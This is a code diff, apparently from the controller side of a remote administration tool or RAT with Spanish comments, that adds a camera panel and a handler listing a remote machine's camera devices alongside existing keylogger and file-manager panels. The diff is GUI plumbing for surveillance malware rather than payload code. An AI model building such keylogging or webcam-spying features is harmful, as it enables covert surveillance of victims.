@@ -6,6 +6,7 @@
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
 #include "panel_keylogger.hpp"
+#include "panel_camara.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -36,9 +37,6 @@ void Cliente_Handler::Spawn_Handler(){
             }
             break;
         }
-
-
-        this->Log(cBuffer);
 
         std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 1);
         if (vcDatos.size() == 0) {
@@ -236,6 +234,20 @@ void Cliente_Handler::Spawn_Handler(){
                 temp_panel->txt_Data->AppendText(cKeyData);
             }else {
                 this->Log("[X] No se pudo encontrar el panel keylogger");
+            }
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
+            std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
+            wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
+            if (panel_cam_combo) {
+                wxArrayString arrCams;
+                for (std::string cCam : vcCams) {
+                    arrCams.push_back(cCam);
+                }
+                panel_cam_combo->Clear();
+                panel_cam_combo->Append(arrCams);
             }
             continue;
         }
